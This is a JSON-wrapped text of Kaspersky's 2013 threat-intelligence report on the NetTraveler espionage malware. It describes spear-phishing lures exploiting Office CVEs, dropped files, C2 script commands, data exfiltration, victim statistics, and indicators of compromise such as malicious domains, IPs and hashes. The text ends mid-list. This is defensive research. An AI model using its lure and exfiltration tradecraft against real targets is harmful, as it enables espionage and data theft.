{
    "id": "53a376f2-b1e1-4c8b-a5df-f1236e24b5b6",
    "created_at": "2022-10-25T16:48:20.288356Z",
    "updated_at": "2025-03-27T02:12:16.074458Z",
    "deleted_at": null,
    "sha1_hash": "4fd06d33aa1a087709277eb71d204e2fbf8b9243",
    "title": "The Nettraveler  (Aka Travnet)",
    "authors": "Kaspersky",
    "file_creation_date": "2013-06-04T15:02:34Z",
    "file_modification_date": "2013-06-04T15:02:39Z",
    "file_size": 2002625,
    "plain_text": "# The NetTraveler  (aka ‘Travnet’)\n\nAuthor Global Research and Analysis Team\n\n\n-----\n\nThe NetTraveler\n\n\n## The NetTraveler\n\n#### Part 1 (public):\n\n>> Executive summary\n\n>> Attack analysis\n\n>> C&C infrastructure\n\n>> Statistics\n\n>> Mitigation\n\n>> Conclusions\n\n#### Part 2 (contact us for more information: intelreports@kaspersky.com):\n\n>> Victim analysis and profiles\n\n>> Command and Control (C&C) infrastructure\n\nand operation\n\n>> Attribution information\n\n\n-----\n\n1. Executive Summary\n\n## 1. Executive Summary\n\nThis report describes multiple cyber-espionage\n\ncampaigns that have successfully compro\nmised more than 350 high profile victims in 40\n\ncountries. The focus of the paper is to describe\n\nNetTraveler, which is the main tool used by the\n\nthreat actors during these attacks.\n\nThe name “NetTraveler” comes from an internal\n\n\nstring which is present in early versions of the\n\nmalware: “NetTraveler Is Running!”. This mal\nware is used by APT actors for basic surveillance\n\nof their victims. Earliest known samples have a\n\ntimestamp of 2005, although references exist\n\nindicating activity as early as 2004. The largest\n\nnumber of samples we observed were created\n\nbetween 2010 and 2013.\n\nKnown targets of NetTraveler (also known as\n\n‘Travnet’ or “Netfile”) include Tibetan/Uyghur\n\nactivists, oil industry companies, scientific re\nsearch centers and institutes, universities,\n\nprivate companies, governments and govern\nmental institutions, embassies and military con\ntractors.\n\nThe NetTraveler backdoor is often used together\n\nwith other malware families. During the anal\nysis of one of the command and control (C&C)\n\n\nservers, we observed how the attackers de\nployed different backdoors to the victims’ ma\nchines. These include the malware known as\n\n“Saker” also known as “Xbox” (known filenames:\n\n“update.exe”, “updata.exe” or “xbox.exe”) and\n\n“PCRat” / ”Zegost”. This report includes a full\n\ndescription of the “Saker/Xbox” backdoor as\n\nwell.\n\nThe attacks use spear-phishing e-mails with\n\nmalicious Microsoft Office documents as attach\nments. Gathered data includes file system list\nings, keylogs, various types of documents (.doc,\n\n.xls, .ppt, .pdf, etc...) and other private informa\ntion. We have calculated the amount of stolen\n\ndata stored on C&C servers to be 22+ gigabytes.\n\nHowever this data represents only a small frac\ntion which we managed to see - the rest of the\n\nit had been previously downloaded and deleted\n\nfrom the C&C servers by the attackers.\n\n\n-----\n\nThe NetTraveler\n\n## 2. Attack analysis\n\nNetTraveler victims get infected through spear-phishing attacks using Office documents\n\nwhich exploit two publicly known vulnerabilities -- CVE-2012-0158 and CVE-2010-3333.\n\nAlthough these vulnerabilities have been patched by Microsoft, they remain effective and\n\nare among the most exploited in targeted attacks.\n\nDuring our analysis, we did not see any advanced use of zero-day vulnerabilities or other\n\nmalware techniques such as rootkits. It is therefore surprising to observe that such un\nsophisticated attacks can still be successful with high profile targets.\n\n### 2.1 Point of entry: spear-phishing examples\n\nWe are listing below several NetTraveler spear-phishing examples observed during the\n\ncourse of this investigation\n\n|MD5|29a420e52b56bfadf9f0701318524bef|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|274,291|\n|Vulnerability Targeted|CVE-2010-3333|\n\n\nThis spear-phish targeted CVE-2010-3333,\n\na very popular vulnerability exploited in many\n\nattacks. The development of this version of\n\nthe exploit delivers a large, easily identified\n\n“0x4141” NOP sled prior to its shellcode, shed\nding some light on the immaturity of the devel\nopment behind the effort. More interesting is\n\n\nthat the target in India received this file titled\n\n“Army Cyber Security Policy 2013.doc”, and\n\nthe accompanying benign and empty decoy\n\nWord document is dropped to the temp folder\n\nand opened with Word as “Jallianwala Bagh\n\nmassacre a deeply shameful act.doc” (MD5:\n\ne617348b8947f28e2a280dd93c75a6ad).\n\n\n-----\n\n2. Attack analysis\n\nKaspersky Lab verdict: Exploit.MSWord.\n\nCVE-2010-3333.cl\n\nThe exploit drops\n\n>> %temp%\\netmgr.dll\n\n>> %temp%\\netmgr.exe\n\n>> %temp%\\perf2012.ini\n\n>> %temp%\\sysinfo2012.dll\n\n>> %temp%\\winlogin.exe\n\nThe malware command and control server\n\nscript is at “hxxp://www.faceboak.net/2012nt/\n\nnettraveler.asp”.\n\nb600089a93275fa935\nMD5\n58695b707b87ad\n\nCreate date (GMT) 2011-04-27 10:10:00\n\nSize 274,291\n\nVulnerability\nCVE-2010-3333\nTargeted\n\nFilename: “invitation.doc”\n\nDecoy filename: “mailnew.doc” (empty)\n\nKaspersky Lab verdict: Exploit.MSWord.\n\nCVE-2010-3333.cl\n\nDrops:\n\n>> %temp%\\netmgr.dll\n\n>> %temp%\\netmgr.exe\n\n\n>> %temp%\\perf2012.ini\n\n>> %temp%\\enumfs.ini\n\n>> %temp%\\dnlist.ini\n\n>> %temp%\\sysinfo2012.dll\n\n>> %temp%\\winlogin.exe\n\n6eb5932b0ed20f11f1a\nMD5\n887bcfbdde10f\n\nCreate date (GMT) 2011-04-27 10:10:00\n\nSize 274,291\n\nVulnerability\nCVE-2010-3333\nTargeted\n\nFilename: “Report - Asia Defense Spending\n\nBoom.doc”\n\nDecoy filename: “Report--Asia Defense Spend\ning Boom.doc” (empty) (MD5: e617348b\n8947f28e2a280dd93c75a6ad)\n\nKaspersky Lab verdict: Exploit.MSWord.\n\nCVE-2010-3333.cl\n\nDrops:\n\n>> %windir%\\system\\config_t.dat\n\n>> %windir%\\system32\\enumfs.ini\n\n>> %windir%\\system32\\dnlist.ini\n\n>> %windir%\\system32\\Iasex.dll\n\n>> %windir%\\system32\\system_t.dll\n\n|MD5|6eb5932b0ed20f11f1a 887bcfbdde10f|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|274,291|\n|Vulnerability Targeted|CVE-2010-3333|\n\n|MD5|b600089a93275fa935 58695b707b87ad|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|274,291|\n|Vulnerability Targeted|CVE-2010-3333|\n\n\n-----\n\n|MD5|917e36946c67414a988f6 878d9d0cdfe|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|252,275|\n|Vulnerability Targeted|CVE-2010-3333|\n\n\nE-mail spear-phishing sample entitled “His Holi\nness the Dalai Lama’s visit to Switzerland day 4”.\n\nAttachment filename: “His Holiness the Dalai\n\nLama’s visit to Switzerland Day 3.doc”\n\nDecoy filename: “His Holiness the Dalai Lama’s\n\nvisit to Switzerland Day 3.doc”\n\nKaspersky Lab verdicts: Exploit.MSWord.\n\nCVE-2010-3333.ci\n\n\nThe NetTraveler\n\nMultiple decoy images depicting a large Tibetan\naudience, and the Dalai Lama speaking\n\nDrops:\n\n>> %AppData%\\Adobe\\netmgr.dll\n\n>> %AppData%\\Adobe\\netmgr.exe\n\n>> %AppData%\\Adobe\\perf2012.ini\n\n>> %AppData%\\Adobe\\sysinfo2012.dll\n\n>> %AppData%\\Adobe\\enumfs.ini\n\n>> %temp%\\winlogin.exe\n\n\n-----\n\n2. Attack analysis\n\n36ed86602661bb3a7a5\nMD5\n5e69fde90ee73\n\nCreate date (GMT) 2011-04-27 10:10:00\n\nSize 252,275\n\nVulnerability\nCVE-2010-3333\nTargeted\n\nFilename: “BJP won’t dump Modi for Nitish NDA\n\nheaded for split.doc”\n\nDecoy filename: “BJP won’t dump Modi for Nitish\n\nNDA headed for split.doc”\n\n\nKaspersky Lab verdict: Exploit.MSWord.CVE\n2010-3333.ci\n\nDrops:\n\n>> %AppData%\\Adobe\\netmgr.dll\n\n>> %AppData%\\Adobe\\netmgr.exe\n\n>> %AppData%\\Adobe\\perf2012.ini\n\n>> %AppData%\\Adobe\\sysinfo2012.dll\n\n>> %AppData%\\Adobe\\enumfs.ini\n\n>> %temp%\\winlogin.exe\n\n|MD5|36ed86602661bb3a7a5 5e69fde90ee73|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|252,275|\n|Vulnerability Targeted|CVE-2010-3333|\n\n\nDecoy document with text related to politics in India.\n\n\n-----\n\n|MD5|059a7482efee3b2abf67c 12d210cb2f7|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|225,139|\n|Vulnerability Targeted|CVE-2010-3333|\n\n|MD5|151e5d1bb8142835633 cfd398e2e0ca3|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|225,139|\n|Vulnerability Targeted|CVE-2010-3333|\n\n\nFilename: “Activity Details.doc”\n\nDecoy filename: “Activity Details.doc” (empty)\n\nKaspersky Lab verdict: Exploit.MSWord.CVE\n2010-3333.ci\n\nDrops:\n\n>> %AppData%\\Adobe\\netmgr.dll\n\n>> %AppData%\\Adobe\\netmgr.exe\n\n>> %AppData%\\Adobe\\perf2012.ini\n\n>> %temp%\\winlogin.exe files.\n\n63494c74db9bfc2bba\nMD5\n3983698c952de9\n\nCreate date (GMT) 2011-04-27 10:10:00\n\nSize 234,355\n\nVulnerability\nCVE-2010-3333\nTargeted\n\nFilename: “Fax13-0417.doc”\n\nDecoy filename: “Fax13-0417.doc” (empty)\n\nKaspersky Lab verdict: Exploit.MSWord.CVE\n2010-3333.ci\n\nDrops\n\n>> %AppData%\\Adobe\\netmgr.dll\n\n>> %AppData%\\Adobe\\netmgr.exe\n\n>> %AppData%\\Adobe\\perf2012.ini\n\n>> %AppData%\\Adobe\\sysinfo2012.dll\n\n>> %AppData%\\Adobe\\enumfs.ini\n\n>> %temp%\\winlogin.exe\n\n\nThe NetTraveler\n\n151e5d1bb8142835633\nMD5\ncfd398e2e0ca3\n\nCreate date (GMT) 2011-04-27 10:10:00\n\nSize 225,139\n\nVulnerability\nCVE-2010-3333\nTargeted\n\nFilename: “The Prayer.doc”\n\nDecoy filename: “Freedom of Speech.doc” (empty)\n\nKaspersky Lab verdict: Exploit.MSWord.CVE\n2010-3333.ci\n\nDrops\n\n>> %AppData%\\Adobe\\netmgr.dll\n\n>> %AppData%\\Adobe\\netmgr.exe\n\n>> %AppData%\\Adobe\\ie.log\n\n>> %AppData%\\Adobe\\perf2012.ini\n\n>> %temp%\\winlogin.exe\n\nf4f14d4a1e34f62eeb9\nMD5\na90b5c8b2cfc1\n\nCreate date (GMT) 2011-04-27 10:10:00\n\nSize 225,139\n\nVulnerability\nCVE-2010-3333\nTargeted\n\nFilename: “23948-report.doc”\n\nDecoy filename: “Report.doc” (empty)\n\nKaspersky Lab verdict: Exploit.MSWord.CVE\n2010-3333.ci\n\nDrops\n\n>> %AppData%\\Adobe\\netmgr.dll\n\n>> %AppData%\\Adobe\\netmgr.exe\n\n>> %AppData%\\Adobe\\enumfs.ini\n\n>> %AppData%\\Adobe\\perf2012.ini\n\n>> %temp%\\winlogin.exe\n\n|MD5|63494c74db9bfc2bba 3983698c952de9|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|234,355|\n|Vulnerability Targeted|CVE-2010-3333|\n\n|MD5|f4f14d4a1e34f62eeb9 a90b5c8b2cfc1|\n|---|---|\n|Create date (GMT)|2011-04-27 10:10:00|\n|Size|225,139|\n|Vulnerability Targeted|CVE-2010-3333|\n\n\n-----\n\n2. Attack analysis\n\ne5954b8204eb321d\nMD5\n20bed4a86b3cef34\n\nCreate date (GMT)\n\nSize 414,703\n\nVulnerability\nCVE-2010-3333\nTargeted\n\nFilename: “Alban Tushaal Jagsaalt.doc”\n\nDecoy filename: “document.doc” (Mongolian\n\ntext)\n\nKaspersky Lab verdict: Exploit.MSWord.CVE\n2010-3333.ci\n\nDrops\n\n>> %temp%\\smcs.exe\n\n>> %windir%\\system\\config_t.dat\n\n>> %windir%\\system32\\6to4ex.dll\n\n>> %windir%\\system32\\svchost.log\n\n|MD5|e5954b8204eb321d 20bed4a86b3cef34|\n|---|---|\n|Create date (GMT)||\n|Size|414,703|\n|Vulnerability Targeted|CVE-2010-3333|\n\n|MD5|0e2b10015fe52b7ea77 a213f0c330557|\n|---|---|\n|Create date (GMT)|2012-06-29 08:31:45|\n|Size|222,208|\n|Vulnerability Targeted|CVE-2012-0158|\n\n\nFilename: “data.xls” (empty decoy)\n\nKaspersky Lab verdict: Exploit.Win32.CVE\n2012-0158.y\n\nDrops:\n\n>> %temp%\\enumfs.ini\n\n>> %temp%\\sysinfo2012.dll\n\n>> %temp%\\dnlist.ini\n\n>> %temp%\\netmgr.dll\n\n>> %temp%\\perf2012.ini\n\n>> %temp%\\netmgr.exe\n\n\nDecoy document with Mongolian writing\n\n\n-----\n\nThe NetTraveler\n\n### 2.3 Installed malware, functionality,\n persistence\n\nNetTraveler is an automatic data exfiltration tool, designed to extract large amounts\n\nof private information from the victim’s system over long periods of time. The malware\n\nuses compression techniques and a fail-safe protocol to ensure that uploaded data is\n\nsafely transferred to the attacker’s C2s.\n\n\nBy default, NetTraveler exfiltrates common file\n\ntypes such as DOC, XLS, PPT, RTF and PDF. For\n\na full list, see the detailed backdoor analysis\n\nbelow. The backdoor configuration can however\n\nbe extended with special options to steal other\n\nfile types. Here’s one such extended configura\ntion recovered from an attack against a victim\n\nworking in the oil industry:\n\n\nIt is clear that the attackers are also collecting\n\nfiles of type “.cdr” (Corel Draw designs), “.dwg”,\n\n“.dxf”, “.cdw”, “.dwf” (AutoCAD projects) and\n\nsome configuration files “.cfn” and “.cfg”.\n\nThe various parameters of the malware are con\nfigured with a builder, which allows the attackers\n\nto change things such as the list of stolen files\n\nextensions, C2 address and so on:\n\n\n-----\n\n2. Attack analysis\n\nNetTraveler configuration GUI\n\n### 2.4 Exfiltrated data\n\nExfiltrated data is encoded with a custom compression and encoding library, which pro\nduces files which resemble BASE64. The data is transferred to the command and control\n\nservers via HTTP requests such as:\n\n\n-----\n\n### 2.5 Overlap with Red\n October\n\nNote: for our analysis of the Red October cam\npaign, see: https://www.securelist.com/en/\n\nblog/785/The_Red_October_Campaign_An_\n\nAdvanced_Cyber_Espionage_Network_Target\ning_Diplomatic_and_Government_Agencies\n\nDuring our analysis of NetTraveler infections,\n\nwe identified several victims that were infected\n\nboth by NetTraveler and Red October. Although\n\nwe see no direct links between the NetTraveler\n\nattackers and the Red October threat actor, the\n\nexistence of victims infected by both of these\n\ncampaigns is interesting.\n\nThese victims are:\n\n>> A Military Contractor in Russia\n\n>> An Embassy in Iran\n\n>> An Embassy in Belgium\n\n>> An Embassy in Kazakhstan\n\n>> An Embassy in Belarus\n\n>> A Government entity in Tajikistan\n\nThese infections indicate that certain high profile\n\nvictims are targeted by multiple threat actors;\n\nthe target information is a valuable commodity.\n\n\nThe NetTraveler\n\n### 2.6 Connections with other campaigns\n\nTo better identify core NetTraveler actors and\n\ndelineate the groups from one another, we\n\ncollect and categorize various Tactics, Tech\nniques, and Procedures (TTPs) employed by\n\nthese adversaries throughout their operations.\n\nThe attacker’s IP operation ranges, overlaps\n\nwith that of a malware family known as “Ze\ngost”. For instance, one of the command and\n\ncontrol servers that is part of the infrastruc\nture, is a well-known C2 for multiple Zegost\n\nvariants, still active as of May 2013. The tar\ngets and command and control domain naming\n\nscheme indicates a connection between the\n\nLurid/Enfal attackers and NetTraveler. Some\n\nof the NetTraveler C2’s are used to distribute\n\na malware known as “Saker” or “Xbox”, which\n\nis delivered as an “update” to the NetTraveler\n\nvictims.\n\nNote: more details about the connections\n\nbetween NetTraveler and other campaigns\n\nis available in our private report. Contact\n\nus at intelreports@kaspersky.com for more\n\ndetails.\n\n\n-----\n\n3. Command and control servers and infrastructure\n\n## 3. Command and control\n servers and infrastructure\n\nDuring our monitoring period, we observed more than 100 command and control URLs,\n\npointing to multiple servers in the United States, China and Hong Kong.\n\nThe command and control servers generally run\n\n\nIIS 6/7, as the C2 backend is an ASP (Microsoft\n\nActive Server Pages) script.\n\nTo transfer stolen data from the command and\n\ncontrol servers, the attackers use FTP on top\n\nof VPN connections through a server in the US\n\nhosted by Krypt Technologies. The infrastructure\n\nis secured by allowing FTP access only to remote\n\nusers coming from predefined IPs, including the\n\nVPN provider in the US.\n\nDuring our investigation, we analyzed several\n\nhundred NetTraveler samples and configuration\n\nfiles, which use more than 30 different C&C serv\ners. The list below includes the script names that\n\nwe have seen on these servers and confirmed\n\nas malicious:\n\n\naasogspread.asp, adfsdfclnggsldfc.asp,\n\nadvertisingservicesa3sb.asp, aneywsf.\n\nasp, apple.asp, applebag005.asp,\n\nazarweforrell.asp, azofjeljgo648rl.asp,\n\ncertify.asp, dochunter.asp, dochunter1.asp,\n\ndochunteradfaefaer.asp, fish.asp, happy.\n\nasp, heritage.asp, huyuio67.asp, little.asp,\n\nmadmaswhbe.asp, nethttpfile.asp, netpass.\n\nasp, nettraveler.asp, orphaned.asp, rice.asp,\n\nsabcfsf.asp, shenghai.asp, time.asp, update.\n\nasp, weathobloe.asp, yegnfvhemc.asp\n\n\nAll the known command and control servers per\nform the same basic functions - for a description\n\nof the supported functionality, see below.\n\n\n-----\n\nThe NetTraveler\n\n\n-----\n\n3. Command and control servers and infrastructure\n\n### 3.1 Description of C2 script functionality\n\nThe main function of Command and Control servers is to collect stolen data from the\n\nvictims. Stolen data is stored in the exact format it was sent from the victim’s PC, without\n\nany additional encoding or obfuscation.\n\nHere’s a listing of how a folder storing stolen victim data could look on the C&C server:\n\nThe uploaded data can be either a document file, a keylogger backlog or a system infor\nmation profile. Here’s how a decoded system information profile looks like:\n\n\n-----\n\nThe NetTraveler\n\nSystem profile, filename is of the form ‘@@@dll@@@travlerbackinfo-[date/time].bak’\n\nThe system profile includes an IPCONFIG output as well as a list of user accounts in the\n\nmachine. If the malware install includes the “NetPass” module, a keylogger will silently\n\ncollect all typed data, together with window names. This produces logs like the following\n\n(in decoded format):\n\nSample decrypted log from the keylogging module\n\n\n-----\n\n3. Command and control servers and infrastructure\n\nThe command and control scripts implement several functions to communicate with the\n\nvictim; during our analysis, we observed four different generations of these scripts, with\n\nvarious degrees of complexity. The main function of the C&C script saves stolen data to\n\na folder in the C2 root, unless the request variable “action” is defined, in which case, it\n\nperforms one of the following commands:\n\n|Command “action”)|Purpose|Script generation|\n|---|---|---|\n|getdata|Read list of commands from the configuration file (eg. “nettraveler. txt”) and send it to the victim. Commands can be “UNINSTALL”, “RESET”, “UPDATE”, “UPLOAD”. For a description of these com- mands see the technical appendix.|nettraveler.asp|\n|updated|Report to the C2 a successful exfiltration of victim’s data.|nettraveler.asp|\n|getemail|Read a template file (eg. “email.eml”) and send to victim|nettraveler.asp|\n|gotemail|Delete template from C2 (“email.eml”)|nettraveler.asp|\n|datasize|Report filesize of additional backdoor module (eg. “updata.exe”)|nettraveler.asp|\n|getcmd|Get specific individual commands to be executed on the victim’s machine.|nettraveler.asp|\n|gotcmd|Delete specific individual command for the victim from the C2|nettraveler.asp|\n|gettext|Send a specific text file from the C2 to the victim (eg. “nethttpfile. txt”)|happy.asp|\n|downloaded|Same as “updated” command|happy.asp|\n|downloadsize, updatesize|Same as datasize|happy.a|\n\n\nThe Command and control scripts reply to the\n\nvictim with either “Success:<size>” or “Fail!”, de\npending on the result of the operation. In some\n\ncases, instead of the “Fail” string, a more de\ntailed error is sent back to the victim, in Simpli\nfied Chinese:\n\n\nUnder normal operation, a victim can connect\n\nto the C2 every five seconds and upload chunks\n\nof data from the victim, until the entire file is\n\nsuccessfully transferred. In case of errors, the\n\nmalware continues to send the data over and\n\nover, until they succeed.\n\n\n“无法删除!” - means “Can not be deleted!”\n\n“该文件不存在!” - means “The file does not exist!”\n\n\n-----\n\nThe NetTraveler\n\n## 4. Global infection statistics\n\nDuring our analysis, we obtained infection logs from several command and control\n\nservers. The logs, which go back as far as 2009, show that the threat actors behind\n\nNetTraveler successfully infected more than 350 victims in 40 countries. The following\n\nmap shows the locations and profile of the victims:\n\n\n-----\n\n4. global infection statistics\n\nThe following map lists the victim profiles by industries:\n\nDiplomatic 32%\n\nGovernment 19%\n\nPrivate 11%\nMilitary 9%\n\n\nFinancial 3%\n\nHealth 2%\n\nActivism 3%\n\nResearch 4%\n\nAirspace 6%\n\nIndustrial and\nInfrastructure 7%\n\n\n_Note: chart does not include the victims that couldn’t be identified_\n\n\nIn addition to the data from the Command and\n\nControl servers, we collected statistics regarding\n\ndetections of NetTraveler from the Kaspersky\n\nSecurity Network. The top 10 infected coun\ntries as reported in KSN (Kaspersky Security\n\nNetwork):\n\n\nBesides the C&C logs and KSN, we have also\n\nsinkholed two of the C&C domains used by\n\nNetTraveler:\n\n>> pkspring.net\n\n>> yangdex.org\n\nThe data set collected so far from the sinkhole\n\nis relatively small and includes victims in Mon\ngolia, South Korea and India. We will continue\n\nto monitor the connections and over time, up\ndate this paper with more data as it becomes\n\navailable.\n\n_Note: Taking into account that several other C&C_\n\n_servers exist for which we have no logs and the KSN_\n\n_coverage, we estimate the total number of victims_\n\n_worldwide to be around ~1,000._\n\n|Position|Country|% of total|\n|---|---|---|\n|1|Mongolia|29%|\n|2|Russia|19%|\n|3|India|11%|\n|4|Kazakhstan|11%|\n|5|Kyrgyzstan|5%|\n|6|China|3%|\n|7|Tajikistan|3%|\n|8|South Korea|2%|\n|9|Spain|2%|\n|10|Germany|1%|\n\n\n-----\n\nThe NetTraveler\n\n\n## 5. Mitigation information\n\n\nFrom the point of view of the victims, the most\n\nimportant part of any report is information on\n\nhow to detect and eradicate the infections. In\n\naddition to running a modern security suite ca\npable of detecting NetTraveler, things such as\n\nfilenames or C2 IPs can be extremely useful to\n\nsystem administrators.\n\nThis part of the report includes:\n\n>> Indicators of compromise\n\n>> Kaspersky detection names\n\n>> MD5s of known samples\n\n### 5.1 Indicators of compromise:\n\nTypes of IOCs:\n\nnetwork traffic / IPs\n\n - 209.11.241.144 - mothership, VPN serv->\n\ner, C2\n\n>> 121.12.124.69 - C2 (allen.w223.\n\nwest263.cn)\n\n>> 61.178.77.111 - C2 (wolf0.3322.org)\n\n>> 182.50.130.68 - C2 (viprambler.com)\n\n>> 103.20.192.59 - C2 (sunshine.59.ydli.net)\n\n\n>> 213.156.6.122 - C2 (cultureacess.com)\n\n>> 209.130.115.38 - C2 (tsgoogoo.net)\n\n>> 98.143.145.80 - C2 (spit113.minidns.\n\nnet)\n\n>> 96.46.4.237 - C2 (sghrhd.190.20081.\n\ninfo)\n\n>> 109.169.86.178 - C2 (imapupdate.com)\n\n>> 125.67.89.156 - C2 (faceboak.net)\n\n>> 142.4.96.6 - C2 (buynewes.com)\n\n>> 124.115.21.209 - C2 IP\n\n>> 67.198.140.148 - C2 (southstock.net)\n\n>> 96.44.179.26 - C2 (vip222idc.\n\ns169.288idc.com)\n\n>> 235.22.123.90 - C2 (gami1.com)\n\n>> 178.77.45.32 - C2 (ra1nru.com)\n\nCommand and control domains and server\n\nnames:\n\n>> allen.w223.west263.cn\n\n>> andriodphone.net\n\n>> bauer.8866.org\n\n>> buynewes.com\n\n>> cultureacess.com\n\n>> discoverypeace.org\n\n>> drag2008.com\n\n>> eaglesey.com\n\n>> enterairment.net\n\n>> faceboak.net\n\n\n-----\n\n5. Mitigation information\n\n>> gami1.com\n\n>> globalmailru.com\n\n>> hint09.9966.org\n\n>> imapupdate.com\n\n>> inwpvpn.com\n\n>> keyboardhk.com\n\n>> localgroupnet.com\n\n>> mailyandexru.com\n\n>> msnnewes.com\n\n>> newesyahoo.com\n\n>> newfax.net\n\n>> pkspring.net - sinkholed by Kaspersky\n\nLab\n\n>> ra1nru.com\n\n>> ramb1er.com\n\n>> sghrhd.190.20081.info\n\n>> southstock.net\n\n>> spit113.minidns.net\n\n>> tsgoogoo.net\n\n>> vip222idc.s169.288idc.com\n\n>> viplenta.com\n\n>> vipmailru.com\n\n>> viprainru.com\n\n>> viprambler.com\n\n>> vipyandex.com\n\n>> vpnwork.3322.org\n\n>> wolf0.3322.org\n\n>> wolf001.us109.eoidc.net\n\n>> yahooair.com\n\n>> yangdex.org - sinkholed by Kaspersky\n\nLab\n\n>> zeroicelee.com\n\nMalware file names on disk:\n\n\n>> Main active group(s) in 2013, unique\n\nconfiguration filenames: perf2012.\n\nini, config_t.dat, config_shenghai.dat,\n\npert2012.ini, in:\n\n - C:\\Documents and Settings\\[user]\\\n\nLocal Settings\\Temp\\\n\n - C:\\Users\\[user]\\Local Settings\\Temp\\\n\n - C:\\WINDOWS\\Temp\\\n\n - C:\\WINDOWS\\system\\\n\n>> Other (older) variants, configs: FMIFEN.INI\n\nin:\n\n - %System%\n\n>> Malware body: net.exe, netmgr.exe, net\n\nmgr.dll in\n\n - C:\\\n\n - C:\\WINDOWS\\system\\\n\n - %system%\n\n - %temp%\n\n - C:\\WINDOWS\\Temp\\\n\n - %appdata%\\Adobe\\\n\n>> Other (older) variants, malware bodies:\n\n - %System%\\bootuid.dll\n\n - %System%\\wuaucit.exe\n\n - %System%\\6to4ex.dll\n\n - %temp%\\Process.dll\n\n - %temp%\\Process.dll_d\n\n - %temp%\\cmss.exe\n\n - %temp%\\sysinfo2012.dll\n\n - %temp%\\winlogin.exe\n\n - %windir%\\system32\\Iasex.dll\n\n - %windir%\\system32\\system_t.dll\n\n - %temp%\\smcs.exe\n\n - %appdata%\\Adobe\\sysinfo2012.dll\n\n\n-----\n\n>> Artifacts during installation and running:\n\n  - %Temp%\\Win32en.baT\n\n  - %System%\\dnlist.ini\n\n  - %temp%\\dnlist.ini\n\n  - %appdata%\\Adobe\\ie.log\n\n  - %temp%\\ie.log\n\n  - %System%\\enumfs.ini\n\n  - %temp%\\enumfs.ini\n\n  - %System%\\install.tmp\n\n  - %System%\\kyrecord.txt\n\n  - C:\\Documents and Settings\\<USER>\\\n\nStart Menu\\Programs\\Startup\\seru\nvice.lnk\n\n  - C:\\Documents and Settings\\<USER>\\\n\nStart Menu\\Programs\\Startup\\net\nmgr.lnk\n\n  - C:\\DOCUME~1\\<USER>~1\\LO\n\nCALS~1\\Temp\\RECYCLER_w\\AllIndex.\n\nini\n\n  - C:\\DOCUME~1\\<USER>~1\\LO\n\nCALS~1\\Temp\\RECYCLER_w\\AllIndex.\n\nini_d\n\nMutexes created during backdoor operation:\n\n>> Boat-12 Is Running!\n\n>> DocHunter2012 Is Running!\n\n>> Hunter-2012 Is Running!\n\n>> NT-2012 Is Running!\n\n>> NetTravler Is Running!\n\n>> NetTravler2012 Is Running!\n\n>> SH-2011 Is Running!\n\n>> ShengHai Is Running!\n\n\nThe NetTraveler\n\n### 5.2 Malware names by Kaspersky products\n\nDetection names for the malware modules and\n\nrelated files:\n\n>> Backdoor.Win32.Bifrose.bcx\n\n>> Trojan-Dropper.Win32.Dorifel.acrn\n\n>> Trojan-Dropper.Win32.Dorifel.acsj\n\n>> Trojan-Dropper.Win32.Dorifel.acsm\n\n>> Trojan-Dropper.Win32.Dorifel.acuf\n\n>> Trojan-Dropper.Win32.Dorifel.cql\n\n>> Trojan-Dropper.Win32.Dorifel.fhg\n\n>> Trojan-Dropper.Win32.Dorifel.fny\n\n>> Trojan-Dropper.Win32.Dorifel.iat\n\n>> Trojan-Dropper.Win32.Dorifel.jam\n\n>> Trojan-Dropper.Win32.Dorifel.kcy\n\n>> Trojan-Dropper.Win32.Dorifel.ylt\n\n>> Trojan-Spy.Win32.TravNet.*\n\n>> Trojan.Multi.Yahg.a\n\n>> Trojan.Win32.Agent2.eakj\n\n>> Trojan.Win32.Agent2.exms\n\n>> Trojan.Win32.Agent2.ezgb\n\n>> Trojan.Win32.Agent2.fdhs\n\n>> Trojan.Win32.Delf.dgmw\n\n>> Trojan.Win32.Delf.dgmx\n\n>> Trojan.Win32.Genome.agyil\n\n>> Trojan.Win32.Genome.aiunu\n\n>> Trojan.Win32.Genome.ajeqr\n\n>> Trojan.Win32.Genome.akqco\n\n>> Trojan.Win32.Genome.aksho\n\n>> Trojan.Win32.Jorik.TravNet.*\n\n>> not-a-virus:Downloader.Win32.NetTrav\n\neler.*\n\n\n-----\n\n5. Mitigation information\n\nKaspersky detection names for malicious\n\ndocuments with embedded exploits used in\n\nspear-phishing attacks:\n\n>> Exploit.MSWord.CVE-2010-3333.cg\n\n>> Exploit.MSWord.CVE-2010-3333.ci\n\n>> Exploit.MSWord.CVE-2010-3333.cl\n\n>> Exploit.Win32.CVE-2012-0158.y\n\n>> Exploit.MSWord.CVE-2012-0158.an\n\n>> Exploit.MSWord.CVE-2012-0158.ax\n\n>> Exploit.Win32.CVE-2012-0158.aa\n\n### 5.3 MD5s of malicious files\n\nSpear-phishing samples MD5s:\n\n36ed86602661bb3a7a55e69fde90ee73\n\n6eb5932b0ed20f11f1a887bcfbdde10f\n\n059a7482efee3b2abf67c12d210cb2f7\n\ne5954b8204eb321d20bed4a86b3cef34\n\n63494c74db9bfc2bba3983698c952de9\n\nb600089a93275fa93558695b707b87ad\n\nf4f14d4a1e34f62eeb9a90b5c8b2cfc1\n\n0e2b10015fe52b7ea77a213f0c330557\n\n29a420e52b56bfadf9f0701318524bef\n\nMalware 